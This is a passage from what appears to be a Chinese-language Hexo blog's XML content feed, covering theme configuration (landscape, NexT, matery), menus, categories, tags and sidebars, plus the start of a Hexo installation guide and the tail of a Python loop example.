words <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span> <span class="token string">'window'</span><span class="token punctuation">,</span> <span class="token string">'defenestrate'</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> w <span class="token keyword">in</span> words<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题修改</title>
    <url>/20221025/f2c40356.html</url>
    <content><![CDATA[<h1>配置新文件模板</h1>
<p>路径：根目录下<code>scaffolds-&gt;post.md</code>。使用<code>hexo new post [title]</code>创建文章的时候，应注意把标题里的空格换为<code>-</code></p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span>
<span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> title <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> date <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token key atrule">tags</span><span class="token punctuation">:</span>
<span class="token key atrule">categories</span><span class="token punctuation">:</span> 
  <span class="token punctuation">-</span> <span class="token punctuation">[</span>未分类<span class="token punctuation">]</span> 
<span class="token key atrule">summary</span><span class="token punctuation">:</span> <span class="token string">""</span>
<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>layout</code></td>
<td style="text-align:left">布局</td>
<td style="text-align:left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td>
</tr>
<tr>
<td style="text-align:left"><code>title</code></td>
<td style="text-align:left">标题</td>
<td style="text-align:left">文章的文件名</td>
</tr>
<tr>
<td style="text-align:left"><code>date</code></td>
<td style="text-align:left">建立日期</td>
<td style="text-align:left">文件建立日期</td>
</tr>
<tr>
<td style="text-align:left"><code>updated</code></td>
<td style="text-align:left">更新日期</td>
<td style="text-align:left">文件更新日期</td>
</tr>
<tr>
<td style="text-align:left"><code>comments</code></td>
<td style="text-align:left">开启文章的评论功能</td>
<td style="text-align:left">true</td>
</tr>
<tr>
<td style="text-align:left"><code>tags</code></td>
<td style="text-align:left">标签（不适用于分页）</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>categories</code></td>
<td style="text-align:left">分类（不适用于分页）</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>permalink</code></td>
<td style="text-align:left">覆盖文章网址</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>excerpt</code></td>
<td style="text-align:left">Page excerpt in plain text. Use <a href="https://hexo.io/docs/tag-plugins#Post-Excerpt">this plugin</a> to format the text</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>disableNunjucks</code></td>
<td style="text-align:left">Disable rendering of Nunjucks tag <code>{{ }}</code>/<code>{% %}</code> and <a href="https://hexo.io/docs/tag-plugins">tag plugins</a> when enabled</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>lang</code></td>
<td style="text-align:left">Set the language to override <a href="https://hexo.io/docs/internationalization#Path">auto-detection</a></td>
<td style="text-align:left">Inherited from <code>_config.yml</code></td>
</tr>
</tbody>
</table>
<h1>landscape（默认）</h1>
<h2 id="GIT地址">GIT地址</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># landscape（默认）</span>
<span class="token function">git</span> clone https://github.com/hexojs/hexo-theme-landscape.git  themes/landscape<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="启用主题">启用主题</h2>
<p>修改<code>_config.yml</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">theme: landscape<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="添加文章目录">添加文章目录</h2>
<ol>
<li>
<p>添加文章目录模块到文章模板中</p>
<p>打开根目录下的<code>\themes\landscape\layout\_partial\article.ejs</code>文件，找到<code>&lt;div class="article-inner"&gt;</code>， 在其上增加以下代码</p>
<pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%</span><span class="token language-javascript"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>index <span class="token operator">&amp;&amp;</span> post<span class="token punctuation">.</span>toc<span class="token punctuation">)</span><span class="token punctuation">{</span> </span><span class="token delimiter punctuation">%&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>article-gide<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gide-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gide-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>文章目录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gide-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> <span class="token function">toc</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>content<span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%</span><span class="token language-javascript"> <span class="token punctuation">}</span> </span><span class="token delimiter punctuation">%&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>在文件<code>\themes\landscape\source\css\_partial\article.styl</code>末尾添加CSS样式</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus"><span class="token selector"><span class="token comment">/* 目录开始 */</span>
.article-gide</span>
  <span class="token atrule-declaration"><span class="token atrule">@media</span> mq-normal</span>
    <span class="token func"><span class="token function">column</span><span class="token punctuation">(</span>sidebar-column<span class="token punctuation">)</span></span>
<span class="token selector">.gide-wrap</span>
  <span class="token property-declaration"><span class="token property">margin</span><span class="token punctuation">:</span> block-margin <span class="token number">0</span></span>
<span class="token selector">.gide-title</span>
  <span class="token atrule-declaration"><span class="token atrule">@extend</span> $block-caption</span>
<span class="token selector">.gide-content</span>
  <span class="token property-declaration"><span class="token property">color</span><span class="token punctuation">:</span> color-sidebar-text</span>
  <span class="token property-declaration"><span class="token property">text-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span><span class="token unit">px</span> <span class="token hexcode">#fff</span></span>
  <span class="token property-declaration"><span class="token property">background</span><span class="token punctuation">:</span> color-widget-background</span>
  <span class="token property-declaration"><span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">-1</span><span class="token unit">px</span> <span class="token number">4</span><span class="token unit">px</span> color-widget-border inset</span>
  <span class="token property-declaration"><span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token unit">px</span> solid color-widget-border</span>
  <span class="token property-declaration"><span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token unit">px</span></span>
  <span class="token property-declaration"><span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token unit">px</span></span>
  <span class="token selector">a</span>
    <span class="token property-declaration"><span class="token property">color</span><span class="token punctuation">:</span> color-link</span>
    <span class="token property-declaration"><span class="token property">text-decoration</span><span class="token punctuation">:</span> none</span>
    <span class="token selector">&amp;:hover</span>
      <span class="token property-declaration"><span class="token property">text-decoration</span><span class="token punctuation">:</span> underline</span>
  <span class="token selector">ul<span class="token punctuation">,</span> ol<span class="token punctuation">,</span> dl</span>
    <span class="token selector">ul<span class="token punctuation">,</span> ol<span class="token punctuation">,</span> dl</span>
      <span class="token property-declaration"><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token unit">px</span></span>
      <span class="token property-declaration"><span class="token property">list-style</span><span class="token punctuation">:</span> disc</span>
<span class="token comment">/* 目录结束 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>修改文件<code>\themes\landscape\source\css\_variables.styl</code>，调整基础布局宽度</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus"><span class="token comment">// Grids</span>
<span class="token variable-declaration"><span class="token variable">column-width</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token unit">px</span></span>
<span class="token variable-declaration"><span class="token variable">gutter-width</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token unit">px</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>调整为</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus"><span class="token comment">// Grids</span>
<span class="token variable-declaration"><span class="token variable">column-width</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token unit">px</span></span>
<span class="token variable-declaration"><span class="token variable">gutter-width</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token unit">px</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>NexT</h1>
<p><a href="https://theme-next.iissnan.com/getting-started.html">初始化配置NexT</a></p>
<h2 id="GIT地址-2">GIT地址</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># next</span>
<span class="token function">git</span> clone https://github.com/theme-next/hexo-theme-next themes/next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="启用主题-2">启用主题</h2>
<p>修改<code>_config.yml</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">theme: next<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="选择-Scheme">选择 Scheme</h2>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">scheme</span><span class="token punctuation">:</span> Pisces</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>
<li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li>
<li>Pisces - 双栏 Scheme</li>
</ul>
<h2 id="设置-语言">设置 语言</h2>
<pre class="line-numbers language-none"><code class="language-none">language: zh-Hans<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>目前 NexT 支持的语言如以下表格所示：</p>
<table>
<thead>
<tr>
<th style="text-align:left">语言</th>
<th style="text-align:left">代码</th>
<th style="text-align:left">设定示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">English</td>
<td style="text-align:left"><code>en</code></td>
<td style="text-align:left"><code>language: en</code></td>
</tr>
<tr>
<td style="text-align:left">简体中文</td>
<td style="text-align:left"><code>zh-Hans</code></td>
<td style="text-align:left"><code>language: zh-Hans</code></td>
</tr>
<tr>
<td style="text-align:left">Français</td>
<td style="text-align:left"><code>fr-FR</code></td>
<td style="text-align:left"><code>language: fr-FR</code></td>
</tr>
<tr>
<td style="text-align:left">Português</td>
<td style="text-align:left"><code>pt</code></td>
<td style="text-align:left"><code>language: pt</code> or <code>language: pt-BR</code></td>
</tr>
<tr>
<td style="text-align:left">繁體中文</td>
<td style="text-align:left"><code>zh-hk</code> 或者 <code>zh-tw</code></td>
<td style="text-align:left"><code>language: zh-hk</code></td>
</tr>
<tr>
<td style="text-align:left">Русский язык</td>
<td style="text-align:left"><code>ru</code></td>
<td style="text-align:left"><code>language: ru</code></td>
</tr>
<tr>
<td style="text-align:left">Deutsch</td>
<td style="text-align:left"><code>de</code></td>
<td style="text-align:left"><code>language: de</code></td>
</tr>
<tr>
<td style="text-align:left">日本語</td>
<td style="text-align:left"><code>ja</code></td>
<td style="text-align:left"><code>language: ja</code></td>
</tr>
<tr>
<td style="text-align:left">Indonesian</td>
<td style="text-align:left"><code>id</code></td>
<td style="text-align:left"><code>language: id</code></td>
</tr>
<tr>
<td style="text-align:left">Korean</td>
<td style="text-align:left"><code>ko</code></td>
<td style="text-align:left"><code>language: ko</code></td>
</tr>
</tbody>
</table>
<h2 id="设置菜单：menu">设置菜单：<code>menu</code></h2>
<ol>
<li>
<p><strong>主题配置文件</strong> 设定菜单内容：</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus">menu<span class="token punctuation">:</span>
  <span class="token property-declaration"><span class="token property">home</span><span class="token punctuation">:</span> <span class="token operator">/</span> <span class="token operator">||</span> fa fa-home</span>
  <span class="token property-declaration"><span class="token property">friendlink</span><span class="token punctuation">:</span> <span class="token operator">/</span>friendlink<span class="token operator">/</span> <span class="token operator">||</span> fa fa-briefcase</span>
  #about<span class="token punctuation">:</span> /about/ || fa fa-user
  <span class="token property-declaration"><span class="token property">tags</span><span class="token punctuation">:</span> <span class="token operator">/</span>tags<span class="token operator">/</span> <span class="token operator">||</span> fa fa-tags</span>
  <span class="token property-declaration"><span class="token property">categories</span><span class="token punctuation">:</span> <span class="token operator">/</span>categories<span class="token operator">/</span> <span class="token operator">||</span> fa fa-th</span>
  <span class="token property-declaration"><span class="token property">archives</span><span class="token punctuation">:</span> <span class="token operator">/</span>archives<span class="token operator">/</span> <span class="token operator">||</span> fa fa-archive</span>
  #schedule<span class="token punctuation">:</span> /schedule/ || fa fa-calendar
  #sitemap<span class="token punctuation">:</span> /sitemap<span class="token punctuation">.</span>xml || fa fa-sitemap
  #commonweal<span class="token punctuation">:</span> /404/ || fa fa-heartbeat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>NexT 默认的菜单</p>
<table>
<thead>
<tr>
<th style="text-align:left">键值</th>
<th style="text-align:left">设定值</th>
<th style="text-align:left">显示文本（简体中文）</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">home</td>
<td style="text-align:left"><code>home: /</code></td>
<td style="text-align:left">主页</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">archives</td>
<td style="text-align:left"><code>archives: /archives</code></td>
<td style="text-align:left">归档页</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">categories</td>
<td style="text-align:left"><code>categories: /categories</code></td>
<td style="text-align:left">分类页</td>
<td>需要手动创建</td>
</tr>
<tr>
<td style="text-align:left">tags</td>
<td style="text-align:left"><code>tags: /tags</code></td>
<td style="text-align:left">标签页</td>
<td>需要手动创建</td>
</tr>
<tr>
<td style="text-align:left">about</td>
<td style="text-align:left"><code>about: /about</code></td>
<td style="text-align:left">关于页面</td>
<td>需要手动创建</td>
</tr>
<tr>
<td style="text-align:left">commonweal</td>
<td style="text-align:left"><code>commonweal: /404.html</code></td>
<td style="text-align:left">公益 404</td>
<td>需要手动创建</td>
</tr>
</tbody>
</table>
<p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。</p>
<p>NexT 使用的是 <a href="http://fontawesome.io/">Font Awesome</a> 提供的图标。若你的站点运行在子目录中，请将链接前缀的 <code>/</code> 去掉。</p>
</li>
<li>
<p>设置菜单项的显示文本</p>
<p>在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/{language}.yml</code> （<code>{language}</code> 为你所使用的语言）。</p>
<p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code>。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-CN.yml</code>，在 <code>menu</code> 字段下添加一项：</p>
<pre class="line-numbers language-none"><code class="language-none">menu:
  home: 首页
  archives: 归档
  categories: 分类
  tags: 标签
  about: 关于
  search: 搜索
  commonweal: 公益404
  something: 有料<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>设定菜单项的图标开关：<code>menu_icons</code></p>
<p>图标配置在“||” 之后。可从主题文件夹<code>source\lib\font-awesome\css\all.min.css</code>中搜索到需要的图标</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># 菜单图标配置示例</span>
<span class="token key atrule">menu_icons</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 將值badge設置為true可以在主題配置文件的menu_settings部分的菜單項中顯示帖子/類別/標籤的計數</span>
  <span class="token key atrule">badges</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="配置分类：categories">配置分类：<code>categories</code></h2>
<ol>
<li>
<p><strong>主题配置文件</strong>放开 <strong>tags: /tags/ || fa fa-tags</strong> 这行代码就已经配置好里分类。</p>
</li>
<li>
<p>创建分类目录文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>编辑页面让主题识别页面为分类页面</p>
<p>上文说到需要编辑页面才能让主题识别这个页面为分类页面，我们只需要根据成功后到提示路径打开<code>index.md</code>这个页面文件，打开后默认内容是</p>
<pre class="line-numbers language-none"><code class="language-none">---
title: 文章分类
date: 2021-01-25 22:37:25
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们需要添加上<code>type: "categories"</code>这段代码就能让主题识别该页面为分类页面了</p>
<pre class="line-numbers language-none"><code class="language-none">---
title: 文章分类
date: 2021-01-25 22:37:25
type: "categories"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们就完成了整个分类页面的配置了</p>
</li>
<li>
<p>给文章设置分类属性</p>
<p>首先打开需要添加分类的文章，在文章里添加上以下文案就设置好分类了</p>
<pre class="line-numbers language-none"><code class="language-none">---
categories: 
- Android
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如上<code>categories:Android</code>表示添加这边文章到 “<strong>Android</strong>” 这个分类下。<br>
然后我们就可以在博客到分类里看到该分类了。</p>
<pre class="line-numbers language-none"><code class="language-none">//设置二级分类
---
categories: 
- Android
- xxx
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如上设置二级分类则该篇文章为 Android 分类下的 XXX 分类下。</p>
</li>
</ol>
<h2 id="配置标签：tags">配置标签：<code>tags</code></h2>
<ol>
<li>
<p><strong>主题配置文件</strong>放开 <strong>tags: /tags/ || fa fa-tags</strong> 这行代码就已经配置好里分类。</p>
</li>
<li>
<p>创建标签目录文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new page tags<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>编辑页面让主题识别页面为标签页面</p>
<p>上文说到需要编辑页面才能让主题识别这个页面为标签页面，我们只需要根据成功后到提示路径打开<code>index.md</code>这个页面文件，添加上<code>type: "tags"</code>这段代码就能让主题识别该页面为标签页面了</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus">---
<span class="token property-declaration"><span class="token property">title</span><span class="token punctuation">:</span> 标签</span>
<span class="token property-declaration"><span class="token property">date</span><span class="token punctuation">:</span> <span class="token number">2021</span><span class="token number">-01</span><span class="token number">-25</span> <span class="token number">22</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token number">58</span></span>
<span class="token property-declaration"><span class="token property">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span></span>
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>给文章设置标签属性</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important">//设置单标签
<span class="token punctuation">---</span></span>
tags:
<span class="token title important">- Facebook配置
<span class="token punctuation">---</span></span>

<span class="token title important">//设置多标签 并同时设置分类
<span class="token punctuation">---</span></span>
categories: 
<span class="token list punctuation">-</span> Android
tags:
<span class="token list punctuation">-</span> Android
<span class="token title important">- RecyclerView
<span class="token punctuation">---</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如上<code>tags:- Facebook配置</code>表示给这篇文章添加 “<strong>Facebook配置</strong>” 这个分标签。<br>
然后我们就可以在博客到标签里看到该标签了。</p>
</li>
</ol>
<h2 id="设置侧栏：sidebar">设置侧栏：<code>sidebar</code></h2>
<p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <strong>主题配置文件</strong> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p>
<ol>
<li>
<p>设置侧栏的位置，修改 <code>sidebar.position</code> 的值，支持的选项有：</p>
<ul>
<li>left - 靠左放置</li>
<li>right - 靠右放置</li>
</ul>
<p>目前仅 Pisces Scheme 支持 <code>position</code> 配置。影响版本<strong>5.0.0</strong>及更低版本。</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">sidebar</span><span class="token punctuation">:</span>
  <span class="token key atrule">position</span><span class="token punctuation">:</span> left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>设置侧栏显示的时机，修改 <code>sidebar.display</code> 的值，支持的选项有：</p>
<ul>
<li><code>post</code> - 默认行为，在文章页面（拥有目录列表）时显示</li>
<li><code>always</code> - 在所有页面中都显示</li>
<li><code>hide</code> - 在所有页面中都隐藏（可以手动展开）</li>
<li><code>remove</code> - 完全移除</li>
</ul>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">sidebar</span><span class="token punctuation">:</span>
  <span class="token key atrule">display</span><span class="token punctuation">:</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>已知侧栏在 <code>use motion: false</code> 的情况下不会展示。 影响版本<strong>5.0.0</strong>及更低版本。</p>
</li>
</ol>
<h2 id="设置头像：avatar">设置头像：<code>avatar</code></h2>
<p>编辑 <strong>主题配置文件</strong>， 修改字段<code>avatar</code> ， 值设置成头像的链接地址。其中，头像的链接地址可以是：</p>
<table>
<thead>
<tr>
<th style="text-align:left">地址</th>
<th style="text-align:left">值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">完整的互联网 URI</td>
<td style="text-align:left"><code>http://example.com/avatar.png</code></td>
</tr>
<tr>
<td style="text-align:left">站点内的地址</td>
<td style="text-align:left">将头像放置主题目录下的 <code>source/uploads/</code> （新建 uploads 目录若不存在） 配置为：<code>avatar: /uploads/avatar.png</code>或者 放置在 <code>source/images/</code> 目录下 配置为：<code>avatar: /images/avatar.png</code></td>
</tr>
</tbody>
</table>
<p>头像设置示例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">avatar: http://example.com/avatar.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="首页只显示部分摘要（不显示全文）">首页只显示部分摘要（不显示全文）</h2>
<p>Next默认是会显示全文的，这样显然很不方便，因此需要一些方法去只显示前面一部分。</p>
<ol>
<li>
<p>修改配置</p>
<p>首先需要在Next主题的_config.yml中把设置打开：(默认安装时就打开了)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Automatically excerpt description in homepage as preamble text.</span>
excerpt_summary: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>之后有两种方法</p>
<ul>
<li>
<p>方法一：写概述</p>
<p>在文章的<code>front-matter</code>中添加<code>description</code>，其中description中的内容就会被显示在首页上，其余一律不显示。</p>
<pre class="line-numbers language-none"><code class="language-none">---
title: 让首页显示部分内容
date: 2020-02-23 22:55:10
summary: 这是显示在首页的概述，正文内容均会被隐藏。
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>方法二：文章截断</p>
<p>在需要截断的地方加入：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!--more--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>首页就会显示这条以上的所有内容，隐藏接下来的所有内容。<br>
例如本文会显示到<code>修改配置</code>上面。</p>
<p>这个明显就方便很多，但当然有利有弊，比如开头都是废话首页看着就不是很好看，因此我一般会先选择方法二，如果感觉文章前面的写的不太好再用方法一。</p>
</li>
</ul>
</li>
</ol>
<h2 id="修改字体">修改字体</h2>
<p>修改<code>themes\next\source\css\_variables\base.styl</code> 文件</p>
<h1>matery</h1>
<h2 id="GIT-地址">GIT 地址</h2>
<blockquote>
<p>参考：<a href="http://blinkfox.com/">http://blinkfox.com/</a></p>
<p>GIT地址：<a href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a></p>
<p>主题下载地址：<a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 搭建博客</title>
    <url>/20221025/b6159bfb.html</url>
    <content><![CDATA[<p>[Toc]</p>
<h1>Hexo 安装和配置</h1>
<h2 id="Hexo相关软件">Hexo相关软件</h2>
<blockquote>
<p>在使用hexo命令时，请使用windows自带的命令行，管理员运行</p>
</blockquote>
<ol>
<li>
<p>安装前提</p>
<p>Hexo是基于Node.js的服务，因此首先需要下载<a href="https://nodejs.org/en/">Node.js</a>( Node.js 12.0 及以上版本), 以及<a href="https://git-scm.com/">Git</a>，再安装<a href="https://link.zhihu.com/?target=https%3A//hexo.io/zh-cn/docs/">Hexo</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>node <span class="token parameter variable">--version</span>
v16.13.0

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>git <span class="token parameter variable">--version</span>
<span class="token function">git</span> version <span class="token number">2.29</span>.2.windows.2

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>hexo <span class="token parameter variable">-v</span>
hexo-cli: <span class="token number">4.3</span>.0
os: win32 <span class="token number">10.0</span>.17763
node: <span class="token number">16.13</span>.0
v8: <span class="token number">9.4</span>.146.19-node.13
uv: <span class="token number">1.42</span>.0
zlib: <span class="token number">1.2</span>.11
brotli: <span class="token number">1.0</span>.9
ares: <span class="token number">1.17</span>.2
modules: <span class="token number">93</span>
nghttp2: <span class="token number">1.45</span>.1
napi: <span class="token number">8</span>
llhttp: <span class="token number">6.0</span>.4
openssl: <span class="token number">1.1</span>.1l+quic
cldr: <span class="token number">39.0</span>
icu: <span class="token number">69.1</span>
tz: 2021a
unicode: <span class="token number">13.0</span>
ngtcp2: <span class="token number">0.1</span>.0-DEV
nghttp3: <span class="token number">0.1</span>.0-DEV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>安装使用hexo-cil</p>
